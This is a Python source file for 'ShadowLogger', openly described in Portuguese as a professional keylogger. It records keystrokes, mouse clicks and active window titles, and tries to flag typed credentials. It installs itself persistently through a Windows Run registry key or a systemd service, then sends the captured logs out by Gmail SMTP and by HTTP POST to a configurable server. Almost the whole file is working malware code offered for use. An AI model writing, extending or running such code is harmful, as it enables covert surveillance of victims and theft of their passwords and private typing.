#!/usr/bin/env python3
"""
ShadowLogger - Keylogger Profissional para Linux/Windows
Desenvolvido por: Renato M. F. Nascimento
Versão: 1.0.0 - 2026
"""

import os
import sys
import json
import time
import threading
from datetime import datetime
from pathlib import Path
from pynput import keyboard, mouse
import requests

try:
    import win32gui
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False

try:
    from PIL import Image, ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

from emailer import Emailer
from utils import LoggerUtils


class ShadowLogger:
    def __init__(self, config_path="config.json"):
        self.config = self.load_config(config_path)
        self.emailer = Emailer(self.config["email"])
        self.logger_utils = LoggerUtils(self.config["logging"])
        
        # Contadores
        self.key_count = 0
        self.word_count = 0
        self.buffer = []
        self.credentials = []
        self.screenshots = []
        self.startup_time = datetime.now()
        self.hostname = os.getenv("COMPUTERNAME", os.uname().nodename)
        
        # Flag de instalação
        self.is_installed = False

    def load_config(self, path):
        """Carrega configurações do arquivo JSON."""
        try:
            with open(path, "r") as f:
                return json.load(f)
        except FileNotFoundError:
            # Configurações padrão se não houver arquivo
            return {
                "email": {
                    "smtp_server": "smtp.gmail.com",
                    "smtp_port": 587,
                    "sender": "renatomfn6@gmail.com",
                    "receiver": "renatomfn6@gmail.com",
                    "username": "renatomfn6@gmail.com",
                    "password": "seu-app-password-aqui",
                    "interval_words": 500
                },
                "logging": {
                    "log_interval": 300,
                    "screenshot_interval": 300,
                    "max_log_size_mb": 50,
                    "log_dir": "logs"
                },
                "bypass": {
                    "hide_window": True,
                    "auto_elevate": True,
                    "trusted_name": "System Monitor"
                }
            }

    def get_active_window(self):
        """Obtém o título da janela ativa."""
        if HAS_WIN32:
            try:
                window = win32gui.GetForegroundWindow()
                title = win32gui.GetWindowText(window)
                return title
            except Exception as e:
                return f"Windows: {e}"
        else:
            # Fallback para Linux
            try:
                import subprocess
                result = subprocess.run(
                    ["xdotool", "getactivewindow", "getname"],
                    capture_output=True, text=True, timeout=2
                )
                return result.stdout.strip()
            except Exception as e:
                return "Linux: xdotool não disponível"

    def on_press(self, key):
        """Callback para teclas pressionadas."""
        try:
            self.buffer.append(key.char)
            self.key_count += 1
            
            # Detecta palavras (espaço)
            if key.char == " ":
                self.word_count += 1
                
                # Detecta credenciais comuns
                if len(self.buffer) > 2 and self.buffer[-2] in ['l', 'L', 'p', 'P', 'e', 'E']:
                    self.credentials.append({
                        "key": self.buffer[-2],
                        "context": self.get_active_window(),
                        "timestamp": datetime.now().isoformat()
                    })
                    
        except AttributeError:
            # Teclas especiais (Enter, Tab, etc.)
            self.buffer.append(f"[{key.name}]")
            self.key_count += 1

        # Envio a cada 500 teclas
        if self.key_count % 500 == 0:
            self.send_log()

        # Salva buffer periodicamente
        if self.key_count % 100 == 0:
            self.logger_utils.save_buffer(self.buffer)
            self.buffer = []

    def on_click(self, x, y, button, pressed):
        """Callback para cliques do mouse."""
        if pressed:
            self.logger_utils.log_event(f"Mouse click: {button} at ({x}, {y})")

    def send_log(self):
        """Envia relatório por e-mail e para o servidor."""
        log_data = {
            "hostname": self.hostname,
            "ip": self.logger_utils.get_ip(),
            "uptime": (datetime.now() - self.startup_time).total_seconds(),
            "keys_pressed": self.key_count,
            "words_typed": self.word_count,
            "credentials": self.credentials[-50:],  # Últimos 50
            "screenshot_count": len(self.screenshots),
            "timestamp": datetime.now().isoformat(),
            "active_window": self.get_active_window()
        }
        
        # Envia para e-mail
        self.emailer.send_report(log_data)
        
        # Envia para servidor (se configurado)
        if "server" in self.config:
            try:
                server_url = f"{self.config['server']['base_url']}{self.config['server']['api_endpoint']}"
                response = requests.post(server_url, json=log_data, timeout=5)
                if response.status_code == 200:
                    self.logger_utils.log_event(f"Server response: {response.json()}")
            except Exception as e:
                self.logger_utils.log_event(f"Server send failed: {e}")

    def run(self):
        """Loop principal do keylogger."""
        print(f"🚀 ShadowLogger iniciado em {datetime.now().isoformat()}")
        
        # Auto-instalação se não estiver instalado
        if not self.is_installed:
            self.install()

        # Inicia listeners
        with keyboard.Listener(on_press=self.on_press) as kb_listener:
            with mouse.Listener(on_click=self.on_click) as mouse_listener:
                print("✅ Listeners iniciados")
                
                # Loop principal
                while True:
                    time.sleep(60)
                    
                    # Captura screenshot periódico
                    if HAS_PIL and len(self.screenshots) % 5 == 0:
                        self.screenshots.append(self.logger_utils.take_screenshot())
                        
                    # Atualiza heartbeat
                    self.logger_utils.log_event("Heartbeat OK")

    def install(self):
        """Instala o keylogger no sistema."""
        print("🛠️ Iniciando instalação...")
        
        # Determina caminho de instalação
        if sys.platform == "win32":
            install_path = Path(os.environ["APPDATA"]) / "ShadowLogger"
        else:
            install_path = Path.home() / ".shadowlogger"
            
        install_path.mkdir(parents=True, exist_ok=True)
        
        # Copia executável
        script_path = Path(sys.argv[0]).resolve()
        if script_path.name != "ShadowLogger":
            dest_path = install_path / script_path.name
            if script_path != dest_path:
                import shutil
                shutil.copy(script_path, dest_path)
                print(f"✅ Copiado para {dest_path}")
        
        # Registra no registry (Windows) ou systemd (Linux)
        if sys.platform == "win32":
            self._install_windows(install_path)
        else:
            self._install_linux(install_path)
        
        # Envia email de instalação
        install_report = {
            "event": "Installation Complete",
            "hostname": self.hostname,
            "ip": self.logger_utils.get_ip(),
            "install_path": str(install_path),
            "timestamp": datetime.now().isoformat(),
            "os": f"{sys.platform} {os.uname().release}"
        }
        self.emailer.send_report(install_report)
        
        self.is_installed = True
        print("✅ Instalação concluída e reportada via e-mail")

    def _install_windows(self, install_path):
        """Instala no Windows via registry."""
        import winreg
        
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_WRITE
            )
            winreg.SetValueEx(
                key,
                "ShadowLogger",
                0,
                winreg.REG_SZ,
                str(install_path / "main.py")
            )
            winreg.CloseKey(key)
            print("✅ Registry registrado (Windows)")
        except Exception as e:
            self.logger_utils.log_event(f"Registry install failed: {e}")

    def _install_linux(self, install_path):
        """Instala no Linux via systemd."""
        systemd_path = Path("/etc/systemd/system")
        service_file = systemd_path / "shadowlogger.service"
        
        if systemd_path.exists():
            service_content = f"""[Unit]
Description=ShadowLogger Keylogger
After=network.target

[Service]
User={os.environ.get('USER', 'root')}
WorkingDirectory={install_path}
ExecStart=/usr/bin/python3 {install_path}/main.py
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
"""
            
            service_file.write_text(service_content)
            print(f"✅ Service file criado em {service_file}")


if __name__ == "__main__":
    logger = ShadowLogger()
    logger.run()
